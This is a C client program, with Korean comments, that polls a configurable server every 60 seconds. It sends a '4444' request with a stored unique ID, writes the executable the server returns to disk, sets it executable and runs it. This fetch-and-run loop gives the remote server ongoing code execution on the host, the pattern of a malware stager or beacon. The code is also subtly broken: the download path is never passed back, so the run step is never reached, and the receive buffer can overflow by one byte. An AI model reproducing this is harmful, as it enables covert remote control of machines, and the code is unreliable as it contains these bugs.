#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h> // For chmod
#include <fcntl.h>    // For open, write
#include <errno.h>    // For errno

#define SERVER_IP "127.0.0.1" // 서버 IP 주소로 변경하세요
#define PORT 443              // TCP 통신 포트
#define BUFFER_SIZE 4096      // 파일 다운로드를 위해 버퍼 크기 증가
#define UNIQUE_ID_LENGTH 8
#define HEADER_LENGTH 4 // 0001, 4444 등 4자리 헤더
#define UNIQUE_ID_FILE "client_unique_id.txt" // 고유 번호 저장 파일

// Function to load unique ID from file
int load_unique_id(char *id_buffer) {
    FILE *fp = fopen(UNIQUE_ID_FILE, "r");
    if (fp == NULL) {
        return 0; // File does not exist
    }
    if (fscanf(fp, "%s", id_buffer) == 1 && strlen(id_buffer) == UNIQUE_ID_LENGTH) {
        fclose(fp);
        return 1; // Successfully loaded
    }
    fclose(fp);
    return 0; // Error loading or malformed ID
}

// Function to request and receive an executable file from the server
// request_header: "4444"
// request_payload: unique_id
// save_path: where to save the downloaded file
int request_and_receive_executable(const char *server_ip, int port, const char *request_header,
                                 const char *request_payload, const char *save_path) {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE];
    FILE *fp = NULL;
    ssize_t bytes_received;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation error for file request");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, server_ip, &serv_addr.sin_addr) <= 0) {
        fprintf(stderr, "Invalid address/ Address not supported for file request \n");
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed for file request");
        close(sock);
        return -1;
    }

    // Send request: "HEADER<PAYLOAD>" (e.g., "4444<UNIQUE_ID>")
    char request_msg[BUFFER_SIZE];
    snprintf(request_msg, sizeof(request_msg), "%s%s", request_header, request_payload);
    printf("Sending request: %s\n", request_msg);

    if (send(sock, request_msg, strlen(request_msg), 0) < 0) {
        perror("Send file request failed");
        close(sock);
        return -1;
    }

    // The first part of the response will be the 4-digit executable name.
    // We expect the server to send the file directly after.
    // Read the first chunk to get the executable name.
    bytes_received = recv(sock, buffer, BUFFER_SIZE, 0);
    if (bytes_received <= 0) {
        perror("Failed to receive first part of file (or server disconnected)");
        close(sock);
        return -1;
    }
    buffer[bytes_received] = '\0';

    // The server is designed to send the 4-digit executable name first,
    // then the file content.
    // Let's assume the first 4 bytes are the executable name
    if (bytes_received < HEADER_LENGTH) {
        fprintf(stderr, "Received malformed response (too short).\n");
        close(sock);
        return -1;
    }

    char executable_name[HEADER_LENGTH + 1];
    strncpy(executable_name, buffer, HEADER_LENGTH);
    executable_name[HEADER_LENGTH] = '\0';
    printf("Expected executable name from server: %s\n", executable_name);

    char local_executable_path[256];
    snprintf(local_executable_path, sizeof(local_executable_path), "./%s", executable_name);

    // Check if executable already exists locally
    if (access(local_executable_path, F_OK) == 0) {
        printf("Executable '%s' already exists locally. Not downloading again.\n", executable_name);
        close(sock); // Close connection as we don't need the file content
        return 0; // Indicate success (file already exists)
    }

    // Open file for writing, starting from the current content (after the 4-digit name)
    fp = fopen(local_executable_path, "wb"); // Write binary mode
    if (fp == NULL) {
        perror("Failed to open file for writing");
        close(sock);
        return -1;
    }

    // Write the remaining part of the first received buffer to the file
    fwrite(buffer + HEADER_LENGTH, 1, bytes_received - HEADER_LENGTH, fp);

    printf("Downloading executable to %s...\n", local_executable_path);
    // Continue receiving the rest of the file
    while ((bytes_received = recv(sock, buffer, BUFFER_SIZE, 0)) > 0) {
        fwrite(buffer, 1, bytes_received, fp);
    }

    if (bytes_received < 0) {
        perror("Executable download failed during transfer");
    } else {
        printf("Executable downloaded successfully: %s\n", local_executable_path);
    }

    if (fp) fclose(fp);
    close(sock);
    return 0;
}

int main(int argc, char *argv[]) {
    char unique_id[UNIQUE_ID_LENGTH + 1] = {0};

    // Load unique ID
    if (!load_unique_id(unique_id)) {
        printf("Unique ID not found in %s. Please run client_0001 first to get your ID.\n", UNIQUE_ID_FILE);
        exit(EXIT_FAILURE);
    }
    printf("Client unique ID: %s\n", unique_id);

    // Main loop to periodically request and check for executable
    while (1) {
        char local_executable_path[256] = {0}; // Will be filled by request_and_receive_executable if downloaded
        char current_executable_name[HEADER_LENGTH + 1] = {0}; // To store the name of the executable that was just run

        // Request file (it will handle download only if not exists)
        int download_result = request_and_receive_executable(SERVER_IP, PORT, "4444", unique_id, local_executable_path);

        if (download_result == 0 && strlen(local_executable_path) > 0) {
            // Extract the executable name from local_executable_path
            char *last_slash = strrchr(local_executable_path, '/');
            if (last_slash == NULL) { // No slash, just file name
                strncpy(current_executable_name, local_executable_path, HEADER_LENGTH);
            } else {
                strncpy(current_executable_name, last_slash + 1, HEADER_LENGTH);
            }
            current_executable_name[HEADER_LENGTH] = '\0';


            if (access(local_executable_path, F_OK) == 0) { // Check if the file now exists (or already existed)
                printf("Executable '%s' ready for execution. Running it...\n", current_executable_name);
                if (chmod(local_executable_path, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH) == -1) {
                    perror("Failed to set executable permissions");
                }
                if (fork() == 0) { // Child process to execute
                    execl(local_executable_path, current_executable_name, NULL);
                    perror("Exec failed");
                    exit(EXIT_FAILURE);
                } else { // Parent process
                    // Wait for child to finish if needed, or just let it run
                }
            } else {
                fprintf(stderr, "Executable '%s' was not found or downloaded successfully at %s.\n", current_executable_name, local_executable_path);
            }
        } else {
            fprintf(stderr, "Failed to get executable via '4444' request.\n");
        }

        sleep(60); // Check every 60 seconds (adjust as needed)
    }

    return 0;
}